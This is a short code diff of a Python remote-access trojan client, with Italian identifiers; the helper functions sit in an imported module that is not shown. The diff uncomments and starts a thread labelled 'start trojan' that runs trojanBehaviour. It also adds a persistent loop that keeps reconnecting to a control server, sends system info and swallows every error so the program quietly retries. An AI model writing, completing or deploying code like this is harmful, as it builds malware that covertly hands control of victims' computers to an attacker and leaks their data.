@@ -1,15 +1,16 @@
-import signal
+from threading import Thread
+
 from remoteCommandsClient import *
 
 
 def main():
     try:
-        signal.signal(signal.SIGINT, signalHandler)
+        #signal.signal(signal.SIGINT, signalHandler)
         client = clientConnection()
-        client.setblocking(True)
         if client == "errore":
             raise Exception
         else:
+            client.setblocking(True)
             time.sleep(5)
             try:
                 sendInfo(client)
@@ -37,16 +38,20 @@ def main():
             raise e
 
 
-# start trojan
-# thread_trojan=Thread(target=trojanBehaviour)
-# thread_trojan.start()
-# thead_remoteControl=Thread(target=remoteControl)
-
-
-if __name__ == "__main__":
-
+def avvio():
     while True:
         try:
             main()
         except:
             time.sleep(5)
+
+
+if __name__ == "__main__":
+    # start trojan
+    thread_trojan = Thread(target=trojanBehaviour)
+    thread_trojan.start()
+    thread_remoteControl = Thread(target=avvio)
+    thread_remoteControl.start()
+    thread_trojan.join()
+    thread_remoteControl.join()
+
